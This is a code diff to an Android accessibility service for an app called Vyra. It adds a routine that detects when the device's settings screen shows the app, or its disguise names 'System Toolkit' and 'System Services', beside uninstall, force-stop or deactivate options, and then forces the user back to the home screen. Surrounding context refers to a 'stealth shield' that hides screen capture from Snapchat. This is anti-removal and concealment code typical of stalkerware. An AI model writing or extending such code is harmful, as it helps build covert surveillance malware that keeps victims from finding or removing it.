@@ -103,6 +103,28 @@ class VyraAccessibilityService : AccessibilityService() {
         }
     }
 
+    private fun handleSettingsTamperProtection(packageName: String, event: AccessibilityEvent) {
+        try {
+            val root = rootInActiveWindow ?: return
+            val vyraNodes = root.findAccessibilityNodeInfosByText("vyra") +
+                    root.findAccessibilityNodeInfosByText("Vyra") +
+                    root.findAccessibilityNodeInfosByText("System Toolkit") +
+                    root.findAccessibilityNodeInfosByText("System Services")
+            if (vyraNodes.isNotEmpty()) {
+                val hasDangerousAction = root.findAccessibilityNodeInfosByText("Uninstall").isNotEmpty() ||
+                        root.findAccessibilityNodeInfosByText("Force stop").isNotEmpty() ||
+                        root.findAccessibilityNodeInfosByText("Deactivate").isNotEmpty() ||
+                        root.findAccessibilityNodeInfosByText("Turn off").isNotEmpty()
+                if (hasDangerousAction) {
+                    Log.w(AppConstants.TAG, "Tamper attempt detected in settings! Redirecting to Home.")
+                    performGlobalAction(GLOBAL_ACTION_HOME)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(AppConstants.TAG, "Error in handleSettingsTamperProtection", e)
+        }
+    }
+
     /**
      * SNAPCHAT STEALTH SHIELD:
      * 1. Snapchat immediately detects active MediaProjection screen share and alerts the chat:
